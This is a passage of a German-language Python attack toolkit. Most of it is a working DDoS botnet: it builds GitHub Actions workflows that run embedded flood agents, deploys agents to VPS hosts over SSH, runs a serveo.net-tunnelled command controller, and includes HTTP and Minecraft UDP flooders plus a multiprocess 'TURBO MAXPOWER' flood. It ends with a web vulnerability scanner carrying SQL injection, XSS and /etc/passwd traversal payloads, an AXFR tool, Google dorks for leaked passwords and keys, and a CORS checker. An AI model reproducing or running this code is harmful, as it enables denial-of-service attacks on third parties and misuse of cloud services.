    # ── 5: KOSTENLOSE CLOUD DEPLOY ───────────────────────────
    elif mode == "5":
        print(f"  {YG}── Kostenloses Cloud-Deployment ────────────────────{R}\n")
        print(f"  {DG}[{G}a{DG}]{R} {G}» Oracle Cloud  — 2 echte VMs für immer kostenlos{R}")
        print(f"  {DG}[{G}b{DG}]{R} {G}» GitHub Actions — kostenlose Rechenzeit nutzen{R}")
        print(f"  {DG}[{G}c{DG}]{R} {G}» Eigener VPS    — SSH-Auto-Deploy (bezahlt){R}")
        sub = inp("Option (a/b/c)").lower().strip()
        div()

        this_script = os.path.abspath(__file__)

        # ── a: Oracle Cloud Always Free ───────────────────────
        if sub == "a":
            print(f"  {YG}── Oracle Cloud Always Free ─────────────────────────{R}\n")
            print(f"  {G}Was du bekommst (KOSTENLOS, für immer):{R}")
            print(f"  {DG}  · 2x AMD VMs  (1 OCPU, 1 GB RAM, Ubuntu){R}")
            print(f"  {DG}  · ODER 1x ARM VM (4 OCPU, 24 GB RAM!){R}")
            print(f"  {DG}  · 10 TB ausgehender Traffic/Monat{R}\n")
            print(f"  {G}Setup-Schritte:{R}")
            print(f"  {DG}  1. Gehe zu: cloud.oracle.com  → Account erstellen{R}")
            print(f"  {DG}  2. Kreditkarte nötig (wird NICHT belastet bei Always Free){R}")
            print(f"  {DG}  3. Region wählen → Compute → Create Instance{R}")
            print(f"  {DG}  4. Shape: VM.Standard.E2.1.Micro  (Always Free){R}")
            print(f"  {DG}  5. Ubuntu 22.04 als OS wählen{R}")
            print(f"  {DG}  6. SSH-Key hinzufügen ODER Passwort setzen{R}")
            print(f"  {DG}  7. Firewall-Regel: Port {_DSN_PORT} TCP eingehend erlauben{R}\n")
            print(f"  {G}Danach: Option c wählen und SSH-Daten eingeben.{R}")
            print(f"  {DG}  Die VM-IP steht im Oracle Dashboard unter Instance Details.{R}")

        # ── b: GitHub Actions VOLLAUTOMATISCH ─────────────────
        elif sub == "b":
            print(f"  {YG}── GitHub Actions Vollautomatisch ───────────────────{R}\n")
            print(f"  {DIM}  Token erstellen: github.com → Settings → Developer settings{R}")
            print(f"  {DIM}  → Personal access tokens → Tokens (classic) → Generate{R}")
            print(f"  {DIM}  → Haken bei 'repo' → Generate → Token kopieren{R}\n")

            gh_token = inp("GitHub Token (ghp_...)")
            if not gh_token.startswith("ghp_") and not gh_token.startswith("github_pat_"):
                print(f"  {G}[!] Kein gültiger Token (muss mit ghp_ beginnen){R}")
                wait(); return

            gh_repo  = inp("Repo-Name [dsn-agents]") or "dsn-agents"
            raw_cp   = inp(f"Controller Port [{_DSN_PORT}]")
            ctrl_port = int(raw_cp) if raw_cp.isdigit() else _DSN_PORT
            div()

            def _gh_api(method, path, data=None):
                url = f"https://api.github.com{path}"
                body = json.dumps(data).encode() if data else None
                req  = urllib.request.Request(url, data=body, method=method)
                req.add_header("Authorization", f"token {gh_token}")
                req.add_header("Accept", "application/vnd.github+json")
                req.add_header("Content-Type", "application/json")
                try:
                    with urllib.request.urlopen(req, timeout=15) as r:
                        return json.loads(r.read()), r.status
                except urllib.error.HTTPError as e:
                    return json.loads(e.read()), e.code

            # Benutzername ermitteln
            print(f"  {DG}[1/5] GitHub-Account prüfen ...{R}")
            user_data, ust = _gh_api("GET", "/user")
            if ust != 200:
                print(f"  {G}[!] Token ungültig: {user_data.get('message','?')}{R}")
                wait(); return
            gh_user = user_data["login"]
            print(f"  {G}[✓] Eingeloggt als: {YG}{gh_user}{R}")

            # Tunnel starten
            print(f"  {DG}[2/5] Starte Internet-Tunnel (max 20s) ...{R}")
            tunnel_proc2 = None
            public_host2 = ""
            public_port2 = str(ctrl_port)
            try:
                tunnel_proc2 = subprocess.Popen(
                    ["ssh", "-o", "StrictHostKeyChecking=no",
                     "-o", "UserKnownHostsFile=/dev/null",
                     "-o", "ServerAliveInterval=30",
                     "-o", "ConnectTimeout=10",
                     "-R", f"0:localhost:{ctrl_port}", "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                _lines2 = []
                def _read_t2(proc=tunnel_proc2, buf=_lines2):
                    for ln in proc.stdout:
                        buf.append(ln)
                threading.Thread(target=_read_t2, daemon=True).start()
                deadline_t = time.time() + 20
                while time.time() < deadline_t:
                    if _lines2:
                        line = _lines2.pop(0)
                        m = re.search(r'tcp://([^:]+):(\d+)', line)
                        if m:
                            public_host2 = m.group(1)
                            public_port2 = m.group(2)
                            break
                    else:
                        time.sleep(0.3)
            except FileNotFoundError:
                print(f"  {YG}[!] SSH fehlt — pkg install openssh / winget install OpenSSH{R}")
            except Exception as ex:
                print(f"  {YG}[!] Tunnel: {ex}{R}")

            if public_host2:
                ctrl_ip = public_host2
                ctrl_port_str = public_port2
                print(f"  {G}[✓] Tunnel: {YG}{ctrl_ip}:{ctrl_port_str}{R}")
            else:
                print(f"  {YG}[!] SSH-Tunnel fehlgeschlagen{R}")
                print(f"  {DIM}    → SSH nicht installiert oder serveo.net nicht erreichbar{R}")
                print(f"  {DIM}    → GitHub Actions braucht eine erreichbare Adresse{R}")
                print(f"  {DIM}    → Installiere SSH: winget install OpenSSH  (Windows){R}")
                print(f"  {DIM}                       pkg install openssh      (Android){R}")
                if tunnel_proc2:
                    tunnel_proc2.terminate()
                wait(); return

            # Repo erstellen
            print(f"  {DG}[3/5] Erstelle Repo '{gh_repo}' ...{R}")
            repo_data, rst = _gh_api("POST", "/user/repos",
                {"name": gh_repo, "private": True, "auto_init": True})
            if rst not in (200, 201, 422):
                print(f"  {G}[!] Repo-Fehler: {repo_data.get('message','?')}{R}")
                if tunnel_proc2: tunnel_proc2.terminate()
                wait(); return
            if rst == 422:
                print(f"  {DIM}  Repo existiert bereits — wird verwendet{R}")
            else:
                print(f"  {G}[✓] Repo erstellt{R}")

            # Kein Script-Upload — Mini-Agent direkt im YAML eingebettet
            print(f"  {DG}[4/5] Übersprungen (Mini-Agent wird direkt eingebettet){R}")
            print(f"  {DG}[5/5] Lade Workflow hoch ...{R}")

            # Mini-Agent als eigenständiges Python-Script (wird im YAML eingebettet)
            agent_py = "\n".join([
                "import socket,json,threading,time,random,sys,urllib.request as ur",
                "def run(ip,port):",
                "    while True:",
                "        try:",
                "            s=socket.socket();s.settimeout(30);s.connect((ip,int(port)));s.settimeout(None)",
                "            buf=b''",
                "            while True:",
                "                c=s.recv(4096)",
                "                if not c: break",
                "                buf+=c",
                "                while b'\\n' in buf:",
                "                    l,buf=buf.split(b'\\n',1)",
                "                    try: m=json.loads(l)",
                "                    except: continue",
                "                    if m.get('action')=='stop': sys.exit(0)",
                "                    if m.get('action')=='start':",
                "                        h=m['target'];p=m['port'];dur=m.get('duration',60)",
                "                        typ=m.get('type','http');thr=m.get('threads',50)",
                "                        st={'sent':0,'err':0};ev=threading.Event()",
                "                        def w(ev=ev,h=h,p=p,d=dur,t=typ,st=st):",
                "                            dl=time.time()+d",
                "                            if t=='mc':",
                "                                ud=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)",
                "                                pay=[b'\\xfe\\x01',b'\\x00'*15,b'\\x02'+b'\\x00'*256];i=0",
                "                                while not ev.is_set() and time.time()<dl:",
                "                                    try: ud.sendto(pay[i%3],(h,p));st['sent']+=1",
                "                                    except: st['err']+=1",
                "                                    i+=1",
                "                            else:",
                "                                url=f'http://{h}:{p}/'",
                "                                while not ev.is_set() and time.time()<dl:",
                "                                    try: ur.urlopen(ur.Request(url,headers={'User-Agent':f'B/{random.randint(1,9999)}'}),timeout=3).close();st['sent']+=1",
                "                                    except: st['err']+=1",
                "                        ts=[threading.Thread(target=w,daemon=True) for _ in range(thr)]",
                "                        [t2.start() for t2 in ts]",
                "                        dl2=time.time()+dur",
                "                        while time.time()<dl2:",
                "                            time.sleep(2)",
                "                            try: s.sendall((json.dumps({'stats':dict(st)})+'\\n').encode())",
                "                            except: break",
                "                        ev.set()",
                "        except Exception as e: time.sleep(3)",
                "run(sys.argv[1],sys.argv[2])",
            ])

            # YAML mit eingebettetem Script
            lines = ["name: DSN Agent",
                     "on:",
                     "  workflow_dispatch:",
                     "jobs:",
                     "  agent:",
                     "    runs-on: ubuntu-latest",
                     "    timeout-minutes: 350",
                     "    strategy:",
                     "      matrix:",
                     "        agent: [1, 2, 3, 4, 5]",
                     "    steps:",
                     "      - uses: actions/setup-python@v4",
                     "        with:",
                     "          python-version: '3.11'",
                     "      - name: Run Agent ${{ matrix.agent }}",
                     "        run: |",
                     "          cat > agent.py << 'PYEOF'"]
            for line in agent_py.splitlines():
                lines.append("          " + line)
            lines.append("          PYEOF")
            lines.append(f"          python3 agent.py {ctrl_ip} {ctrl_port_str}")
            workflow_yaml = "\n".join(lines) + "\n"
            wf_b64 = base64.b64encode(workflow_yaml.encode()).decode()
            wf_path_api = f"/repos/{gh_user}/{gh_repo}/contents/.github/workflows/dsn_agent.yml"
            existing_wf, ewc = _gh_api("GET", wf_path_api)
            wf_payload = {"message": "add workflow", "content": wf_b64}
            if ewc == 200:
                wf_payload["sha"] = existing_wf["sha"]
            _, wusc = _gh_api("PUT", wf_path_api, wf_payload)
            if wusc in (200, 201):
                print(f"  {G}[✓] Workflow hochgeladen{R}")
            else:
                print(f"  {YG}[!] Workflow-Upload fehlgeschlagen (Code {wusc}){R}")

            print(f"\n  {DG}╔══════════════════════════════════════════════╗{R}")
            print(f"  {DG}║{R}  {YG}FERTIG — Jetzt nur noch:{R}                    {DG}║{R}")
            print(f"  {DG}║{R}  {G}github.com/{gh_user}/{gh_repo}/actions{R}  {DG}║{R}")
            print(f"  {DG}║{R}  {DIM}→ 'DSN Agent' → Run workflow → Run workflow{DG}  ║{R}")
            print(f"  {DG}║{R}  {DIM}→ 5 Agents verbinden sich automatisch{DG}        ║{R}")
            print(f"  {DG}║{R}  {C}Tunnel: {YG}{ctrl_ip}:{ctrl_port_str}{DG}{' '*max(0,30-len(ctrl_ip)-len(ctrl_port_str))}║{R}")
            print(f"  {DG}╚══════════════════════════════════════════════╝{R}\n")
            print(f"  {DIM}Tunnel läuft — ENTER zum Beenden{R}")
            try: input()
            except KeyboardInterrupt: pass
            if tunnel_proc2: tunnel_proc2.terminate()

        # ── c: Eigener VPS per SSH ────────────────────────────
        elif sub == "c":
            vps_ip    = inp("VPS IP-Adresse")
            vps_user  = inp("SSH-Benutzername (meist 'root')")
            vps_pass  = inp("SSH-Passwort  (leer lassen = Key)")
            ctrl_ip   = inp("Controller IP (deine öffentliche IP)")
            raw_cp    = inp(f"Controller Port [{_DSN_PORT}]")
            ctrl_port = int(raw_cp) if raw_cp.isdigit() else _DSN_PORT
            div()

            remote_path = "/root/open_vs.py"
            ssh_base = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
            scp_base = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
            target   = f"{vps_user}@{vps_ip}"

            # sshpass für Passwort-Auth
            prefix = []
            if vps_pass:
                chk = subprocess.run(
                    ["where" if os.name == "nt" else "which", "sshpass"],
                    capture_output=True)
                if chk.returncode == 0:
                    prefix = ["sshpass", "-p", vps_pass]
                else:
                    print(f"  {YG}sshpass nicht gefunden — manuelle Befehle:{R}\n")
                    print(f"  {DIM}scp {this_script} {target}:{remote_path}{R}")
                    print(f"  {DIM}ssh {target} \"nohup python3 {remote_path} --dsn-agent {ctrl_ip} {ctrl_port} > /tmp/dsn.log 2>&1 &\"{R}")
                    wait(); return

            print(f"  {DG}[1/3] Script hochladen ...{R}")
            try:
                r1 = subprocess.run(
                    prefix + scp_base + [this_script, f"{target}:{remote_path}"],
                    capture_output=True, text=True, timeout=60)
                if r1.returncode != 0:
                    print(f"  {G}[!] {r1.stderr[:80]}{R}"); wait(); return
                print(f"  {G}[✓] Hochgeladen{R}")
            except Exception as e:
                print(f"  {G}[!] {e}{R}"); wait(); return

            print(f"  {DG}[2/3] Python3 installieren falls nötig ...{R}")
            try:
                subprocess.run(
                    prefix + ssh_base + [target,
                     "python3 --version 2>/dev/null || apt-get install -y python3 -qq"],
                    capture_output=True, text=True, timeout=120)
                print(f"  {G}[✓] Python OK{R}")
            except: print(f"  {YG}[?] Weiter ...{R}")

            print(f"  {DG}[3/3] Agent starten ...{R}")
            try:
                r3 = subprocess.run(
                    prefix + ssh_base + [target,
                     f"nohup python3 {remote_path} --dsn-agent {ctrl_ip} {ctrl_port} "
                     f"> /tmp/dsn.log 2>&1 & echo PID:$!"],
                    capture_output=True, text=True, timeout=30)
                pid = next((l.replace("PID:","") for l in r3.stdout.splitlines() if l.startswith("PID:")), "?")
                print(f"  {G}[✓] Agent läuft auf {vps_ip} (PID {pid}){R}")
                print(f"  {DG}    Logs: ssh {target} cat /tmp/dsn.log{R}")
            except Exception as e:
                print(f"  {G}[!] {e}{R}"); wait(); return

            print(f"\n  {YG}Fertig! Gehe zu Option 1 → ENTER → Agent verbindet sich.{R}")

    # ── 6: INTERNET-TUNNEL via serveo.net ────────────────────
    elif mode == "6":
        listen_port = _DSN_PORT
        raw_p = inp(f"Controller-Port [{listen_port}]")
        if raw_p.isdigit(): listen_port = int(raw_p)

        print(f"\n  {C}[~] Starte Internet-Tunnel (serveo.net) ...{R}")
        print(f"  {DIM}    SSH muss installiert sein. Kein Account nötig.{R}\n")

        tunnel_proc = None
        public_addr = ""
        try:
            tunnel_proc = subprocess.Popen(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ServerAliveInterval=30",
                 "-R", f"0:localhost:{listen_port}",
                 "serveo.net"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True
            )
            # Warte auf die öffentliche Adresse
            import select as _sel
            deadline = time.time() + 15
            while time.time() < deadline:
                line = tunnel_proc.stdout.readline()
                if not line:
                    time.sleep(0.2); continue
                m = re.search(r'Forwarding TCP.*?tcp://([^\s]+)', line)
                if m:
                    public_addr = m.group(1)
                    break
                if "error" in line.lower() or "denied" in line.lower():
                    print(f"  {G}[!] Tunnel-Fehler: {line.strip()}{R}")
                    break
        except FileNotFoundError:
            print(f"  {G}[!] SSH nicht gefunden.{R}")
            print(f"  {DIM}    Windows: winget install OpenSSH{R}")
            print(f"  {DIM}    Android: pkg install openssh{R}")
            wait(); return
        except Exception as e:
            print(f"  {G}[!] {e}{R}"); wait(); return

        if not public_addr:
            print(f"  {G}[!] Konnte keine öffentliche Adresse bekommen.{R}")
            print(f"  {DIM}    Versuche Alternative: ssh -R 0:localhost:{listen_port} serveo.net{R}")
            if tunnel_proc: tunnel_proc.terminate()
            wait(); return

        host, _, port_str = public_addr.rpartition(":")
        print(f"  {G}[✓] Tunnel aktiv!{R}")
        print(f"  {DG}╔══════════════════════════════════════════╗{R}")
        print(f"  {DG}║{R}  {YG}Agents verbinden mit:{R}                    {DG}║{R}")
        print(f"  {DG}║{R}  {C}Host: {YG}{host:<34}{DG}  ║{R}")
        print(f"  {DG}║{R}  {C}Port: {YG}{port_str:<34}{DG}  ║{R}")
        print(f"  {DG}╚══════════════════════════════════════════╝{R}")
        print(f"  {DIM}  Funktioniert über JEDES Netzwerk (4G, andere WiFi, etc.){R}\n")

        # Jetzt normaler Controller auf lokalem Port
        agents      = []
        agents_lock = threading.Lock()
        stop_accept = threading.Event()
        all_stats   = {}

        def _accept_loop6(srv):
            while not stop_accept.is_set():
                try:
                    srv.settimeout(1.0)
                    conn, addr = srv.accept()
                    with agents_lock:
                        agents.append((conn, addr))
                        all_stats[str(addr)] = {"sent":0,"errors":0}
                    sys.stdout.write(f"\r  {G}[+] Agent verbunden: {addr[0]}:{addr[1]}   {R}")
                    sys.stdout.flush()
                except socket.timeout: continue
                except: break

        srv6 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv6.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv6.bind(("0.0.0.0", listen_port))
        srv6.listen(32)

        attack_type = inp("Angriffstyp: mc / http").lower().strip()
        if attack_type not in ("mc","http"): attack_type = "http"
        target  = inp("Ziel IP / Domain")
        if not target:
            if tunnel_proc: tunnel_proc.terminate()
            srv6.close(); wait(); return
        raw_port = inp("Ziel-Port")
        tgt_port = int(raw_port) if raw_port.isdigit() else (25565 if attack_type=="mc" else 80)
        raw_th   = inp("Threads pro Agent [50]")
        thr      = int(raw_th) if raw_th.isdigit() else 50
        raw_dur  = inp("Dauer Sekunden [60]")
        duration = int(raw_dur) if raw_dur.isdigit() else 60

        print(f"\n  {DIM}Warte auf Agents — ENTER wenn alle verbunden ...{R}\n")
        t6 = threading.Thread(target=_accept_loop6, args=(srv6,), daemon=True)
        t6.start()
        input()
        stop_accept.set()

        with agents_lock: n_agents = len(agents)
        if n_agents == 0:
            print(f"  {G}[!] Keine Agents verbunden{R}")
            if tunnel_proc: tunnel_proc.terminate()
            srv6.close(); wait(); return

        print(f"  {G}[✓] {n_agents} Agent(s) — starte Angriff ...{R}\n")
        cfg = (json.dumps({"action":"start","type":attack_type,"target":target,
                           "port":tgt_port,"threads":thr,"duration":duration})+"\n").encode()

        def _sr6(conn, astr):
            buf = b""
            conn.settimeout(duration+10)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    buf += chunk
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n",1)
                        try:
                            s = json.loads(line).get("stats",{})
                            with agents_lock:
                                all_stats[astr]["sent"]   = s.get("sent",0)
                                all_stats[astr]["errors"] = s.get("errors",0)
                        except: pass
            except: pass

        stat_threads = []
        with agents_lock: snap = list(agents)
        for conn, addr in snap:
            try: conn.sendall(cfg)
            except: pass
            t = threading.Thread(target=_sr6, args=(conn, str(addr)), daemon=True)
            t.start(); stat_threads.append(t)

        t0 = time.time()
        print(f"  {DG}╔{'═'*58}╗{R}")
        while time.time()-t0 < duration:
            time.sleep(1)
            el = int(time.time()-t0)
            with agents_lock:
                ts = sum(v["sent"] for v in all_stats.values())
                te = sum(v["errors"] for v in all_stats.values())
            sys.stdout.write(
                f"\r  {DG}║{R}  {G}Agents:{n_agents}  Pkts:{ts:<9}  Err:{te:<7}  "
                f"PPS:{ts/max(el,1):>8.0f}  [{el:>3}s/{duration}s]{R}  {DG}║{R}")
            sys.stdout.flush()
        print(f"\n  {DG}╚{'═'*58}╝{R}")
        stop_msg = (json.dumps({"action":"stop"})+"\n").encode()
        for conn,_ in snap:
            try: conn.sendall(stop_msg)
            except: pass
        for t in stat_threads: t.join(timeout=2)
        for conn,_ in snap:
            try: conn.close()
            except: pass
        srv6.close()
        if tunnel_proc: tunnel_proc.terminate()

    # ── 7: TURBO MAXPOWER (Prozesse + Threads kombiniert) ────
    elif mode == "7":
        print(f"  {C}[~] TURBO MAXPOWER — Prozesse × Threads = Maximum{R}\n")
        attack_type = inp("Angriffstyp: mc / http").lower().strip()
        if attack_type not in ("mc","http"): attack_type = "mc"
        target = inp("Ziel IP / Domain")
        if not target: wait(); return
        raw_port = inp("Ziel-Port (25565 MC / 80 HTTP)")
        tgt_port = int(raw_port) if raw_port.isdigit() else (25565 if attack_type=="mc" else 80)
        raw_dur  = inp("Dauer Sekunden [60]")
        duration = int(raw_dur) if raw_dur.isdigit() else 60

        n_cpu   = _mp.cpu_count()
        n_procs = n_cpu
        n_thr   = max(1, 100 // n_cpu)  # Threads pro Prozess → gesamt ~100

        print(f"\n  {DIM}  {n_procs} Prozesse × {n_thr} Threads = {n_procs*n_thr} parallele Bots{R}")
        print(f"  {DIM}  Das ist das Maximum was dieses Geraet leisten kann.{R}\n")

        sent_val = _mp.Value(_ctypes.c_longlong, 0)
        err_val  = _mp.Value(_ctypes.c_longlong, 0)

        # Jeder Prozess spawnt n_thr Threads intern
        def _maxpower_proc(tgt, port, dur, atype, sent_v, err_v, n_threads):
            import threading as _thr
            import socket as _sock
            import time as _time
            import random as _rand
            lock = _thr.Lock()
            stop = _thr.Event()

            def worker():
                deadline = _time.time() + dur
                if atype == "mc":
                    payloads = [b"\xfe\x01",
                                b"\x00\x00\x00\x00\x09\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01",
                                bytes([0x02]) + b"\x00"*256]
                    udp = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                    udp.setsockopt(_sock.SOL_SOCKET, _sock.SO_SNDBUF, 1024*1024)
                    idx = 0
                    while not stop.is_set() and _time.time() < deadline:
                        try:
                            udp.sendto(payloads[idx % 3], (tgt, port))
                            with sent_v.get_lock(): sent_v.value += 1
                        except:
                            with err_v.get_lock(): err_v.value += 1
                        idx += 1
                    udp.close()
                else:
                    import urllib.request as _ur
                    url = f"http://{tgt}:{port}/" if not tgt.startswith("http") else tgt
                    while not stop.is_set() and _time.time() < deadline:
                        try:
                            req = _ur.Request(url,
                                headers={"User-Agent": f"M/{_rand.randint(1,9999)}"})
                            with _ur.urlopen(req, timeout=3): pass
                            with sent_v.get_lock(): sent_v.value += 1
                        except:
                            with err_v.get_lock(): err_v.value += 1

            threads = [_thr.Thread(target=worker, daemon=True) for _ in range(n_threads)]
            for t in threads: t.start()
            _time.sleep(dur + 1)
            stop.set()
            for t in threads: t.join(timeout=1)

        print(f"  {G}[►] Starte gegen {target}:{tgt_port} für {duration}s ...{R}\n")
        procs = [_mp.Process(target=_maxpower_proc,
                             args=(target, tgt_port, duration, attack_type,
                                   sent_val, err_val, n_thr),
                             daemon=True)
                 for _ in range(n_procs)]
        for p in procs: p.start()

        t0 = time.time()
        print(f"  {DG}╔{'═'*58}╗{R}")
        print(f"  {DG}║{R}  {YG}TURBO MAXPOWER  {DG}│{R}  {C}{attack_type.upper()}  {DG}│{R}  {G}{target}:{tgt_port}{' '*max(0,18-len(target))}{DG}║{R}")
        print(f"  {DG}╠{'═'*58}╣{R}")
        while time.time() - t0 < duration:
            time.sleep(0.5)
            el   = time.time() - t0
            s    = sent_val.value
            e    = err_val.value
            sys.stdout.write(
                f"\r  {DG}║{R}  {DIM}Bots:{R} {G}{n_procs*n_thr:<4}{R}"
                f"  {DIM}Pkts:{R} {G}{s:<10}{R}"
                f"  {DIM}PPS:{R} {YG}{s/max(el,0.1):>9.0f}{R}"
                f"  {DG}[{int(el):>3}s/{duration}s]{R}  {DG}║{R}")
            sys.stdout.flush()
        print(f"\n  {DG}╠{'═'*58}╣{R}")
        fs, fe = sent_val.value, err_val.value
        print(f"  {DG}║{R}  {YG}FERTIG{R}  {DIM}Pakete:{R} {G}{fs}{R}  {DIM}Fehler:{R} {G}{fe}{R}  {DIM}⌀PPS:{R} {YG}{fs/max(duration,1):.0f}{R}{' '*4}{DG}║{R}")
        print(f"  {DG}╚{'═'*58}╝{R}")
        for p in procs: p.terminate(); p.join(timeout=2)

    wait()


# ── 85  VULNERABILITY SCANNER ────────────────────────────────
def vuln_scanner():
    hdr("VULNERABILITY SCANNER")
    print(f"  {DIM}Scannt Webziele auf häufige Schwachstellen.{R}\n")
    target = inp("Ziel (z.B. example.com oder http://...)")
    if not target: wait(); return
    if not target.startswith("http"): target = "http://" + target
    div()
    checks = [
        ("SQL Injection",  [f"{target}/?id=1'", f"{target}/?q=1 OR 1=1--"],
         ["sql syntax","mysql","you have an error","warning: mysql","unclosed quotation","odbc","syntax error"]),
        ("XSS",            [f"{target}/?q=<script>alert(1)</script>", f"{target}/?search=<img src=x onerror=1>"],
         ["<script>alert","onerror=","<img src=x"]),
        ("Path Traversal", [f"{target}/?file=../../../../etc/passwd", f"{target}/?path=../../../windows/win.ini"],
         ["root:x:","[fonts]","boot.ini","[extensions]"]),
        ("Open Redirect",  [f"{target}/?url=http://evil.com", f"{target}/?redirect=//evil.com"],
         ["evil.com"]),
    ]
    found = []
    for name, urls, sigs in checks:
        _spinner(f"Prüfe {name} ...", duration=0.6)
        hit = False
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=6) as r:
                    body = r.read(8192).decode(errors="ignore").lower()
                if any(s in body for s in sigs):
                    hit = True; break
            except: pass
        status = f"{G}[MÖGL. VULN]{R}" if hit else f"{DIM}[OK]{R}"
        print(f"  {DG}[{status}{DG}]{R}  {YG}{name}{R}")
        if hit: found.append(name)
    div()
    if found:
        print(f"  {G}⚠ Mögliche Schwachstellen: {', '.join(found)}{R}")
    else:
        print(f"  {G}Keine offensichtlichen Schwachstellen gefunden.{R}")
    print(f"  {DIM}Hinweis: Dies ist kein vollständiger Scan — nur Quick-Check.{R}")
    wait()


# ── 86  DNS ZONE TRANSFER ─────────────────────────────────────
def dns_zone_transfer():
    hdr("DNS ZONE TRANSFER (AXFR)")
    print(f"  {DIM}Versucht AXFR-Zonentransfer — zeigt alle DNS-Einträge.{R}\n")
    domain = inp("Domain (z.B. example.com)")
    if not domain: wait(); return
    div()
    _spinner("Ermittle NS-Server ...", 0.8)
    try:
        ns_raw = subprocess.check_output(
            ["nslookup", "-type=ns", domain], stderr=subprocess.DEVNULL, timeout=8
        ).decode(errors="ignore")
        ns_servers = re.findall(r'nameserver\s*=\s*(\S+)', ns_raw, re.IGNORECASE)
        if not ns_servers:
            ns_servers = re.findall(r'(\S+\.\S+)\s*\n', ns_raw)
    except:
        ns_servers = []
    if not ns_servers:
        print(f"  {G}[!] Keine NS-Server gefunden.{R}"); wait(); return
    print(f"  {DG}NS-Server: {', '.join(ns_servers[:3])}{R}\n")
    success = False
    for ns in ns_servers[:3]:
        ns = ns.rstrip(".")
        try:
            _spinner(f"AXFR von {ns} ...", 0.5)
            result = subprocess.check_output(
                ["nslookup", "-type=any", "-querytype=AXFR", domain, ns],
                stderr=subprocess.STDOUT, timeout=10
            ).decode(errors="ignore")
            if any(x in result.lower() for x in ["address","cname","mx record","transfer failed","soa"]):
                print(f"  {G}[+] Antwort von {ns}:{R}\n")
                for line in result.splitlines():
                    if line.strip() and "server:" not in line.lower():
                        print(f"  {DG}  {line}{R}")
                success = True; break
        except: pass
    if not success:
        print(f"  {G}[✓] Alle NS-Server verweigern AXFR — korrekt konfiguriert.{R}")
    wait()


# ── 87  GOOGLE DORK GENERATOR ────────────────────────────────
def google_dork_gen():
    hdr("GOOGLE DORK GENERATOR")
    print(f"  {DIM}Generiert Such-Dorks für Pentest-Recherche.{R}\n")
    target = inp("Domain / Keyword (z.B. example.com)")
    if not target: wait(); return
    div()
    dorks = [
        ("Admin Panels",      f'site:{target} inurl:admin OR inurl:login OR inurl:dashboard'),
        ("Passwort-Dateien",  f'site:{target} filetype:txt "password" OR "passwd"'),
        ("Konfig-Dateien",    f'site:{target} filetype:env OR filetype:cfg OR filetype:config'),
        ("SQL-Dumps",         f'site:{target} filetype:sql'),
        ("Backup-Dateien",    f'site:{target} filetype:bak OR filetype:backup OR filetype:old'),
        ("Offene Verzeichnisse",f'site:{target} intitle:"Index of /"'),
        ("PHP-Fehler",        f'site:{target} "PHP Parse error" OR "mysql_fetch" OR "Warning: mysql"'),
        ("Exposed Git",       f'site:{target} inurl:.git'),
        ("API Keys",          f'site:{target} intext:"api_key" OR intext:"apikey" OR intext:"secret_key"'),
        ("Kamera-Feeds",      f'inurl:"view.shtml" OR inurl:"ViewerFrame?Mode=" site:{target}'),
        ("Dokumente",         f'site:{target} filetype:pdf OR filetype:docx OR filetype:xlsx'),
        ("E-Mails",           f'site:{target} intext:"@{target}"'),
        ("Subdomains",        f'site:*.{target} -www'),
        ("Login-Seiten",      f'site:{target} inurl:wp-login OR inurl:cpanel OR inurl:phpmyadmin'),
    ]
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    h = _pad(f"  {YG}DORKS FÜR: {target.upper()}{R}", W)
    print(f"  {DG}║{R}{h}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    for i, (label, dork) in enumerate(dorks, 1):
        print(f"  {DG}║{R}  {C}[{i:>2}]{R}  {YG}{label:<22}{R}  {DIM}{dork[:44]}{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    choice = inp("Dork-Nummer zum Kopieren/Anzeigen (oder ENTER)")
    if choice.isdigit() and 1 <= int(choice) <= len(dorks):
        label, dork = dorks[int(choice)-1]
        print(f"\n  {YG}Google URL:{R}")
        enc = dork.replace(" ", "+").replace(":", "%3A").replace('"','%22')
        print(f"  {G}https://www.google.com/search?q={enc}{R}\n")
        print(f"  {DIM}Dork:{R}")
        print(f"  {G}{dork}{R}")
    wait()


# ── 88  CORS CHECKER ─────────────────────────────────────────
def cors_checker():
    hdr("CORS MISCONFIGURATION CHECKER")
    print(f"  {DIM}Prüft ob die Seite CORS falsch konfiguriert hat.{R}\n")
    target = inp("URL (z.B. https://example.com/api)")
    if not target: wait(); return
    if not target.startswith("http"): target = "https://" + target
    div()
    origins = [
        "https://evil.com",
        "null",
        f"https://evil.{target.split('/')[2]}",
        "https://attacker.com",
    ]
    vulns = []
    for origin in origins:
        try:
            req = urllib.request.Request(target)
            req.add_header("Origin", origin)
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=6) as r:
                headers = dict(r.headers)
                acao = headers.get("Access-Control-Allow-Origin","")
                acac = headers.get("Access-Control-Allow-Credentials","")
            if acao == "*":
                vulns.append(f"Wildcard (*) — jede Domain erlaubt")
            elif acao == origin:
                cred = " + Credentials!" if acac.lower()=="true" else ""
                vulns.append(f"Reflektiert Origin '{origin}'{cred}")
            elif acao == "null":
                vulns.append("Origin 'null' erlaubt (null-Origin Angriff möglich)")
            else:
                print(f"  {DIM}[OK]{R}  {DG}Origin: {origin} → ACAO: {acao or 'kein Header'}{R}")
        except Exception as e:
            print(f"  {DIM}[--]{R}  {DG}{origin} → {e}{R}")
    div()
    if vulns:
        print(f"  {G}⚠ CORS-Fehlkonfiguration gefunden:{R}")
        for v in vulns:
            print(f"  {G}  → {v}{R}")
    else:
